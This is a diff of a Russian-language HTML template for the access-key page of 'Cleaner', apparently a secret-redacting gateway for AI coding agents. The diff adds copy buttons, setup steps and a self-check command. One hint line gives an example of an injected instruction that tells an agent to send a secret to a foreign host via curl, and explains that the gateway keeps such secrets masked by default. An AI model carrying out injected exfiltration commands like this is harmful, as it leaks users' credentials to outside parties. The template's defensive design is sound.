@@ -1,4 +1,5 @@
 {% extends "base.html" %}
+{% from "_ui.html" import icon %}
 {% block title %}Ключи — Cleaner{% endblock %}
 {% block main %}
 <h1>Ключи доступа</h1>
@@ -8,13 +9,17 @@
   <header class="panel-head"><h2 class="title">Ключ показан один раз</h2></header>
   <div class="panel-body">
     <p class="flash warn">Скопируйте ключ сейчас: после ухода со страницы его не показать — Cleaner хранит только отпечаток.</p>
-    <pre class="text mono">{{ issued }}</pre>
     {% if agent_settings %}
+    <ol class="key-steps">
+    <li><p class="sub">Ключ <button type="button" data-copy="issued-key">{{ icon("copy") }}<span>Скопировать ключ</span></button></p>
+    <pre class="text mono" id="issued-key">{{ issued }}</pre></li>
+    <li><p class="sub">Сертификат. Cleaner самоподписанный: {% if cert %}<a href="/cert.pem" download>Сертификат службы</a> — {% endif %}сохраните его файл на машине агента и впишите путь к нему вместо <code>&lt;путь к файлу сертификата Cleaner на этой машине&gt;</code>, проверку TLS не выключайте.</p></li>
+    <li><p class="sub">Настройки агента.</p>
     {% for kind, text in agent_settings %}
     {% if kind == "claude_code" %}
-    <p class="sub">Claude Code — блок <code>env</code> в <code>.claude/settings.local.json</code> проекта (или режим <code>cleaner</code> в <code>claude-switch.ps1</code>).</p>
+    <p class="sub">Claude Code — блок <code>env</code> в <code>.claude/settings.local.json</code> проекта.</p>
     {% elif kind == "claude_sub" %}
-    <p class="sub">Claude Code со входом claude.ai — блок <code>env</code> в <code>.claude/settings.local.json</code> проекта (или режим <code>claude-switch.ps1 cleaner-sub</code>). Без <code>ANTHROPIC_AUTH_TOKEN</code> и <code>ANTHROPIC_API_KEY</code>: они заменили бы вход подписки.</p>
+    <p class="sub">Claude Code со входом claude.ai — блок <code>env</code> в <code>.claude/settings.local.json</code> проекта. Без <code>ANTHROPIC_AUTH_TOKEN</code> и <code>ANTHROPIC_API_KEY</code>: они заменили бы вход подписки.</p>
     {% elif kind == "codex" %}
     <p class="sub">Codex — свой провайдер в <code>~/.codex/config.toml</code> (или <code>-c</code> в командной строке); ключ — в переменной <code>CLEANER_KEY</code>, сертификат — в <code>CODEX_CA_CERTIFICATE</code>.</p>
     {% elif kind == "opencode" %}
@@ -22,12 +27,20 @@
     {% elif kind == "sdk" %}
     <p class="sub">SDK OpenAI для Python; сертификат — в переменной <code>SSL_CERT_FILE</code>.</p>
     {% endif %}
-    <pre class="text mono">{{ text }}</pre>
-    {% endfor %}
-    <p class="sub">Сертификат Cleaner самоподписанный: {% if cert %}<a href="/cert.pem" download>Сертификат службы</a> — {% endif %}сохраните его файл на машине агента и впишите путь к нему вместо <code>&lt;путь к файлу сертификата Cleaner на этой машине&gt;</code>, проверку TLS не выключайте.</p>
+    <p><button type="button" data-copy="agent-settings-{{ loop.index }}">{{ icon("copy") }}<span>Скопировать</span></button></p>
+    <pre class="text mono" id="agent-settings-{{ loop.index }}">{{ text }}</pre>
+    {% endfor %}</li>
+    <li><p class="sub">Самопроверка: ключ, доступ, модель, протокол, сертификат и доступность провайдера — без вашего текста, провайдер получает только пустой GET. В ответе — список проверок и их итог.</p>
+    <p><button type="button" data-copy="agent-check">{{ icon("copy") }}<span>Скопировать команду</span></button></p>
+    <pre class="text mono" id="agent-check">{{ check_command }}</pre></li>
+    <li><p class="sub">Первый запрос: запустите агента и дайте короткое задание. Что ушло модели, видно в <a href="/chats">текущем чате шлюза</a> ключа.</p></li>
+    </ol>
     {% else %}
+    <p><button type="button" data-copy="issued-key">{{ icon("copy") }}<span>Скопировать ключ</span></button></p>
+    <pre class="text mono" id="issued-key">{{ issued }}</pre>
     <p class="sub">Проверка из командной строки:</p>
-    <pre class="text mono">curl -H "X-Cleaner-Key: {{ issued }}" {{ endpoint }}</pre>
+    <p><button type="button" data-copy="api-check">{{ icon("copy") }}<span>Скопировать команду</span></button></p>
+    <pre class="text mono" id="api-check">curl -H "X-Cleaner-Key: {{ issued }}" {{ endpoint }}</pre>
     {% endif %}
   </div>
 </section>
@@ -107,6 +120,8 @@
         <label class="check"><input type="checkbox" name="ner" value="1"> Имена и организации (слой 4)</label>
         <label class="check"><input type="checkbox" name="llm" value="1"> Допроверка локальной моделью (слой 5)</label>
         <small class="hint">По умолчанию шлюз работает слоями 1–3 и словарём организации; слои 4 и 5 замедляют каждый ход агента</small>
+        <label class="check"><input type="checkbox" name="restore_foreign" value="1"> Восстанавливать секреты и учётные записи и в адресах чужих узлов</label>
+        <small class="hint">Без отметки пароль или учётная запись в адресе узла, которого нет в запросе агента и среди узлов чата (<code>curl https://чужой-узел/?k=…</code> из внедрённой инструкции), остаётся заменой; квитанция запроса это отмечает</small>
       </span></div>
       {% endif %}
       <div class="key-summary flash" data-key-summary role="status" aria-live="polite"></div>
